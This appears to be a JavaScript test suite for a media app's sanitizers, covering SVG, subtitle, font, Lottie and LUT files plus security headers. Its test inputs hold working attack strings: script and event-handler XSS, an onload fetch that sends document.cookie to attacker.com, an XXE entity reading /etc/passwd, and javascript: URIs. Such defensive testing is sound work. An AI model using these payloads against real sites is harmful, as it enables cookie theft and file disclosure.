import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import {
  sanitizeSvg,
  sanitizeSubtitles,
  validateFontBuffer,
  sanitizeLottieJson,
  sanitizeCubeLut
} from '../utils/sanitizer.ts';

test('W6: SVG Sanitization against XSS & XXE vectors', () => {
  // 1. Script tag injection
  const maliciousSvg1 = `<svg xmlns="http://www.w3.org/2000/svg"><script>alert('xss')</script><circle cx="50" cy="50" r="40"/></svg>`;
  const clean1 = sanitizeSvg(maliciousSvg1);
  assert.ok(!clean1.includes('<script>'), 'Must remove <script> tags');
  assert.ok(clean1.includes('<circle'), 'Must preserve safe elements');

  // 2. Event handlers injection (onload, onerror)
  const maliciousSvg2 = `<svg onload="fetch('http://attacker.com?cookie='+document.cookie)"><rect width="100" height="100" onerror="alert(1)"/></svg>`;
  const clean2 = sanitizeSvg(maliciousSvg2);
  assert.ok(!clean2.includes('onload='), 'Must remove onload handler');
  assert.ok(!clean2.includes('onerror='), 'Must remove onerror handler');

  // 3. foreignObject & iframe embedding
  const maliciousSvg3 = `<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>`;
  const clean3 = sanitizeSvg(maliciousSvg3);
  assert.ok(!clean3.includes('foreignObject') && !clean3.includes('iframe'), 'Must remove foreignObject and iframe');

  // 4. XXE / DTD injection
  const maliciousSvg4 = `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`;
  const clean4 = sanitizeSvg(maliciousSvg4);
  assert.ok(!clean4.includes('<!DOCTYPE'), 'Must strip DOCTYPE');
  assert.ok(!clean4.includes('<!ENTITY'), 'Must strip ENTITY');
});

test('W6: Subtitle Text Sanitization (.srt, .vtt, .lrc)', () => {
  const dirtySrt = `1\n00:00:01,000 --> 00:00:04,000\nHello <script>alert('xss')</script><img src="x" onerror="evil()"/>world!`;
  const clean = sanitizeSubtitles(dirtySrt);
  assert.ok(!clean.includes('<script>'), 'Must strip <script> tag');
  assert.ok(!clean.includes('onerror='), 'Must strip event handlers');
  assert.ok(clean.includes('Hello'), 'Must preserve valid subtitle text');
  assert.ok(clean.includes('world!'), 'Must preserve valid subtitle text');
});

test('W6: Font Binary Header Magic Bytes Validation', () => {
  // 1. Valid TTF (0x00 0x01 0x00 0x00)
  const validTtf = new Uint8Array([0x00, 0x01, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x80]).buffer;
  const resTtf = validateFontBuffer(validTtf);
  assert.strictEqual(resTtf.valid, true);
  assert.strictEqual(resTtf.format, 'ttf');

  // 2. Valid OTF ('OTTO')
  const validOtf = new Uint8Array([0x4f, 0x54, 0x54, 0x4f, 0x00, 0x0c, 0x00, 0x80]).buffer;
  const resOtf = validateFontBuffer(validOtf);
  assert.strictEqual(resOtf.valid, true);
  assert.strictEqual(resOtf.format, 'otf');

  // 3. Valid WOFF ('wOFF')
  const validWoff = new Uint8Array([0x77, 0x4f, 0x46, 0x46, 0x00, 0x01, 0x00, 0x00]).buffer;
  const resWoff = validateFontBuffer(validWoff);
  assert.strictEqual(resWoff.valid, true);
  assert.strictEqual(resWoff.format, 'woff');

  // 4. Valid WOFF2 ('wOF2')
  const validWoff2 = new Uint8Array([0x77, 0x4f, 0x46, 0x32, 0x00, 0x01, 0x00, 0x00]).buffer;
  const resWoff2 = validateFontBuffer(validWoff2);
  assert.strictEqual(resWoff2.valid, true);
  assert.strictEqual(resWoff2.format, 'woff2');

  // 5. Malicious Executable disguised as font ('MZ' Windows binary header)
  const fakeExe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]).buffer;
  const resExe = validateFontBuffer(fakeExe);
  assert.strictEqual(resExe.valid, false, 'Must reject executable binary');

  // 6. Oversized buffer (> 15MB)
  const oversized = new ArrayBuffer(16 * 1024 * 1024);
  const resOver = validateFontBuffer(oversized);
  assert.strictEqual(resOver.valid, false);
});

test('W6: Lottie JSON Sanitization & Schema Verification', () => {
  // 1. Valid Lottie object
  const validLottie = {
    v: '5.7.0',
    fr: 30,
    ip: 0,
    op: 60,
    w: 500,
    h: 500,
    layers: [],
    assets: [{ id: 'img_1', u: 'images/', p: 'sticker.png' }]
  };
  const resValid = sanitizeLottieJson(JSON.stringify(validLottie));
  assert.strictEqual(resValid.valid, true);

  // 2. Malicious asset with javascript: scheme
  const evilLottie = {
    v: '5.7.0',
    fr: 30,
    layers: [],
    assets: [{ id: 'img_1', u: 'javascript:alert(1)', p: 'data:text/html,<script>evil()</script>' }]
  };
  const resEvil = sanitizeLottieJson(evilLottie);
  assert.strictEqual(resEvil.valid, true);
  assert.strictEqual(resEvil.data.assets[0].u, '', 'Must strip javascript: link');
  assert.strictEqual(resEvil.data.assets[0].p, '', 'Must strip data:text/html link');

  // 3. Arbitrary non-Lottie object
  const nonLottie = { attack: 'payload', payload: 12345 };
  const resNonLottie = sanitizeLottieJson(nonLottie);
  assert.strictEqual(resNonLottie.valid, false, 'Must reject non-Lottie object');
});

test('W6: 3D LUT (.cube) File Sanitization & Memory Guards', () => {
  const cubeSample = `
TITLE "<script>alert(1)</script>Teal & Orange"
LUT_3D_SIZE 2
0.0 0.0 0.0
0.5 0.2 0.1
0.2 0.7 0.3
1.0 1.0 1.0
0.1 0.2 0.3
0.4 0.5 0.6
0.7 0.8 0.9
1.0 0.9 0.8
  `;

  const parsed = sanitizeCubeLut(cubeSample);
  assert.ok(!parsed.title.includes('<script>'), 'Title must be sanitized');
  assert.strictEqual(parsed.size, 2);
  assert.strictEqual(parsed.data.length, 24); // 2*2*2*3 = 24 floats

  // Rejects invalid size > 65
  const evilSizeCube = `LUT_3D_SIZE 200\n0.0 0.0 0.0`;
  assert.throws(() => sanitizeCubeLut(evilSizeCube), /Kích thước hợp lệ/);
});

test('W6: Security Headers in vercel.json & public/_headers', () => {
  const vercelPath = path.resolve(process.cwd(), 'vercel.json');
  const vercelContent = fs.readFileSync(vercelPath, 'utf8');
  const vercelJson = JSON.parse(vercelContent);

  const globalHeaders = vercelJson.headers[0].headers;
  const headerKeys = globalHeaders.map((h) => h.key);

  assert.ok(headerKeys.includes('Content-Security-Policy'), 'Must have Content-Security-Policy');
  assert.ok(headerKeys.includes('Permissions-Policy'), 'Must have Permissions-Policy');
  assert.ok(headerKeys.includes('Referrer-Policy'), 'Must have Referrer-Policy');
  assert.ok(headerKeys.includes('X-Frame-Options'), 'Must have X-Frame-Options: DENY');
  assert.ok(headerKeys.includes('Cross-Origin-Opener-Policy'), 'Must have COOP: same-origin');
  assert.ok(headerKeys.includes('Cross-Origin-Embedder-Policy'), 'Must have COEP: credentialless');

  // Verify public/_headers exists and matches
  const headersFilePath = path.resolve(process.cwd(), 'public/_headers');
  assert.ok(fs.existsSync(headersFilePath), 'public/_headers must exist for Cloudflare/Netlify');
  const headersFileText = fs.readFileSync(headersFilePath, 'utf8');
  assert.ok(headersFileText.includes('Content-Security-Policy'), '_headers must have CSP');
});
